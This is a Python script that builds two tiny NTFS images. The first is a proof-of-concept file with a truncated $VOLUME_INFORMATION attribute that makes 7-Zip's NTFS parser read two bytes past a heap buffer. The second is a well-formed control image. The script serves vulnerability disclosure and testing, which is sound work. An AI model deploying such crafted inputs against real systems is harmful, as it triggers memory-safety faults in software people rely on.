#!/usr/bin/env python3
"""Build the checked-in NTFS inputs with Python's standard library.

Both images are minimal but structurally valid NTFS volumes:

  sector 0        boot sector accepted by CHeader::Parse
  clusters 1-4    four in-use MFT records (512 bytes each):
                    record 0 ($MFT)      non-resident $DATA, 4 clusters at LCN 1
                    records 1, 2         empty FILE records
                    record 3 ($Volume)   resident $VOLUME_NAME "PoC" and a
                                         resident $VOLUME_INFORMATION

poc.ntfs     carries an 8-byte $VOLUME_INFORMATION payload. 7-Zip 26.04 reads
             payload bytes 8 and 9 (the volume version fields of the 12-byte
             NTFS structure) without checking the payload length, two bytes
             past the exact-size heap buffer that holds the attribute data.

control.ntfs is identical except the attribute carries the full 12-byte
             payload (version 3.1), which every checked release parses in
             bounds. It separates the missing length check from a general
             failure to parse volume information.
"""
import pathlib
import struct
import sys

SECTOR = 512
TOTAL_CLUSTERS = 128          # one sector per cluster; 64 KiB image
MFT_CLUSTER = 1
NUM_MFT_RECORDS = 4
MFT_SIZE = NUM_MFT_RECORDS * SECTOR


def resident_attr(atype: int, data: bytes) -> bytes:
    length = (0x18 + len(data) + 7) & ~7
    a = bytearray(length)
    struct.pack_into('<I', a, 0x00, atype)
    struct.pack_into('<I', a, 0x04, length)
    a[0x08] = 0                                # resident
    struct.pack_into('<H', a, 0x0A, 0x18)      # name offset
    struct.pack_into('<I', a, 0x10, len(data))  # data size
    struct.pack_into('<H', a, 0x14, 0x18)      # data offset
    a[0x18:0x18 + len(data)] = data
    return bytes(a)


def mft_data_attr() -> bytes:
    """Non-resident $DATA for the $MFT record: 4 clusters at LCN 1."""
    a = bytearray(0x48)
    struct.pack_into('<I', a, 0x00, 0x80)      # $DATA
    struct.pack_into('<I', a, 0x04, len(a))
    a[0x08] = 1                                # non-resident
    struct.pack_into('<H', a, 0x0A, 0x18)      # name offset
    struct.pack_into('<Q', a, 0x10, 0)                     # LowVcn
    struct.pack_into('<Q', a, 0x18, NUM_MFT_RECORDS - 1)    # HighVcn
    struct.pack_into('<H', a, 0x20, 0x40)      # run-list offset
    a[0x22] = 0                                # CompressionUnit = 0
    struct.pack_into('<Q', a, 0x28, MFT_SIZE)   # AllocatedSize
    struct.pack_into('<Q', a, 0x30, MFT_SIZE)   # Size
    struct.pack_into('<Q', a, 0x38, MFT_SIZE)   # InitializedSize
    # One run: header 0x11 (1 length byte, 1 offset byte), 4 clusters, LCN 1,
    # then the 0x00 run-list terminator.
    a[0x40:0x44] = bytes([0x11, NUM_MFT_RECORDS, MFT_CLUSTER, 0x00])
    return bytes(a)


END_MARKER = struct.pack('<I', 0xFFFFFFFF) + b'\x00' * 4


def mft_record(rec_number: int, attrs: bytes) -> bytes:
    """Build one 512-byte FILE record with a valid USA fixup."""
    rec = bytearray(SECTOR)
    rec[0:4] = b'FILE'
    struct.pack_into('<H', rec, 0x04, 0x30)          # usaOffset
    struct.pack_into('<H', rec, 0x06, 2)             # numUsaItems = 1 sector + 1
    struct.pack_into('<H', rec, 0x10, 1)             # SeqNumber
    struct.pack_into('<H', rec, 0x14, 0x38)          # attrOffs
    struct.pack_into('<H', rec, 0x16, 0x0001)         # Flags: in use
    struct.pack_into('<I', rec, 0x18, 0x38 + len(attrs))  # bytesInUse
    struct.pack_into('<I', rec, 0x1C, SECTOR)         # bytesAlloc
    struct.pack_into('<I', rec, 0x2C, rec_number)     # record number
    rec[0x38:0x38 + len(attrs)] = attrs
    # USA fixup as validated by CMftRec::ParseRec: the word at the record end
    # must equal the USN stored at 0x30; the parser restores the saved original
    # from 0x32 before parsing attributes.
    saved = rec[SECTOR - 2:SECTOR]
    usn = 0x0003
    struct.pack_into('<H', rec, 0x30, usn)
    rec[0x32:0x34] = saved
    struct.pack_into('<H', rec, SECTOR - 2, usn)
    return bytes(rec)


def build_image(volume_info_payload: bytes) -> bytes:
    if len(volume_info_payload) not in (8, 12):
        raise AssertionError('volume-info payload must be 8 or 12 bytes')
    img = bytearray(TOTAL_CLUSTERS * SECTOR)

    bs = bytearray(SECTOR)
    bs[0] = 0xEB
    bs[1] = 0x3C
    bs[2] = 0x90
    bs[3:11] = b'NTFS    '                      # OEM name; k_Signature starts at byte 3
    struct.pack_into('<H', bs, 0x0B, SECTOR)   # bytes per sector
    bs[0x0D] = 1                                # 1 sector per cluster
    bs[0x15] = 0xF8                            # media type: fixed disk
    struct.pack_into('<Q', bs, 0x28, TOTAL_CLUSTERS)   # NumSectors
    struct.pack_into('<Q', bs, 0x30, MFT_CLUSTER)      # $MFT cluster
    struct.pack_into('<I', bs, 0x40, 1)        # 1 cluster per MFT record -> 512 B
    struct.pack_into('<I', bs, 0x44, 1)        # clusters per index block
    struct.pack_into('<H', bs, 0x1FE, 0xAA55)
    img[0:SECTOR] = bs

    rec0 = mft_record(0, mft_data_attr() + END_MARKER)
    rec1 = mft_record(1, END_MARKER)
    rec2 = mft_record(2, END_MARKER)
    vol_name = resident_attr(0x60, "PoC".encode('utf-16-le') + b'\x00\x00')
    vol_info = resident_attr(0x70, volume_info_payload)
    rec3 = mft_record(3, vol_name + vol_info + END_MARKER)

    img[1 * SECTOR:2 * SECTOR] = rec0
    img[2 * SECTOR:3 * SECTOR] = rec1
    img[3 * SECTOR:4 * SECTOR] = rec2
    img[4 * SECTOR:5 * SECTOR] = rec3
    return bytes(img)


def main() -> None:
    if len(sys.argv) != 2:
        raise SystemExit("usage: make-poc.py OUTPUT_DIRECTORY")
    out = pathlib.Path(sys.argv[1])
    out.mkdir(parents=True, exist_ok=True)
    # The trigger: an 8-byte $VOLUME_INFORMATION payload.
    (out / 'poc.ntfs').write_bytes(build_image(b'\x00' * 8))
    # The control: the full 12-byte payload, reserved[8], major 3, minor 1.
    (out / 'control.ntfs').write_bytes(build_image(bytes(8) + bytes([3, 1]) + bytes(2)))


if __name__ == '__main__':
    main()